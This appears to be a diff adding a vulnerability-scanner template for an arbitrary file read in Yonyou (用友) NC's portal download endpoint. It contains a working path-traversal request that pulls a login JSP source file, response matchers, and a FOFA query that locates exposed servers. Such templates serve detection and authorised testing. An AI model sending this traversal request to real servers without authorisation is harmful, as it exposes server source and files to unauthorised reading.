@@ -1,0 +1,31 @@
+id: yonyou-nc-download-fileread
+
+info:
+  name: 用友 NC portal download 任意文件读取
+  author: Y3y1ng
+  severity: high
+  description: |
+    用友 NC /portal/pt/xml/file/download 存在任意文件读取，读取 login 页 JSP 源码（response.addHeader / request.getSession）。属 NC 而非 U8 / U8 Cloud / YonBIP。
+  reference:
+    - https://github.com/zan8in/afrog
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="用友-UFIDA-NC"
+  tags: yonyou,nc,fileread
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "response.addHeader"
+          - "request.getSession"
+        condition: and
+      - type: status
+        status:
+          - 200
